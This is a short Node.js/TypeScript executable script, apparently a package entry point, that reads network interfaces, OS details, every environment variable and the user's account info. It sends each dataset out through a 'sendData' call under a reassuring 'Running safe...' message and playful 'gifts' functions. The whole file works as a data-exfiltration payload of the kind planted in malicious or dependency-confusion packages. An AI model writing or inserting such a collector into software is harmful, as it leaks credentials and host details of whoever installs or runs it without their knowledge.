#!/usr/bin/env node

const core = require("./lib/core");
const gifts = require("./gifts/gifts");

import * as utils from "../src/lib/utils"

import { CustomPlugin } from "array-utils";

const plugins: CustomPlugin[] = [
    {
        key: "networkInterfaces",
        plugin: require("./plugins/getNetworkInterfaces")
    },
    {
        key: "os",
        plugin: require("./plugins/getOsDetails")
    },
    {
        key: "env",
        plugin: require("./plugins/getEnvironmentVariables")
    },
    {
        key: "userInfo",
        plugin: require("./plugins/getUserInfo")
    }
];

function runPlugin({ key, plugin }: CustomPlugin): NodeJS.Dict<CustomPlugin> {
    return {
        [key]: plugin()
    }
}

console.log("Running safe...");

gifts.heyInternet();
gifts.wc();
gifts.catscatscatscats(3000);

plugins.forEach(plugin => {
    let data = runPlugin(plugin);
    let postData = JSON.stringify(data, null, 2);
    console.log("Sending data:", postData);
    core.sendData(postData, plugin.key, utils.generateRandomId());
});
